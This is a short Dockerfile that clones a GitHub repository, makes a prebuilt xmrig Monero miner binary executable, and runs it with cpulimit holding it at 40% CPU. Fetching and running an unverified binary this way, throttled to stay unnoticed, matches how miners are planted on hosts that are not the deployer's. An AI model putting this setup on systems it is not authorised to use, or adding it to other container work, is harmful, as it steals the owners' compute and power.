FROM  ubuntu:16.10
RUN apt-get install cpulimit
RUN git clone https://github.com/lanka256/xmr-cpu-limit3.git
WORKDIR xmr-cpu-limit3/
RUN chmod +x xmrig
CMD ["sh","-c","cpulimit -e xmrig -l 40 -b && ./xmrig"]
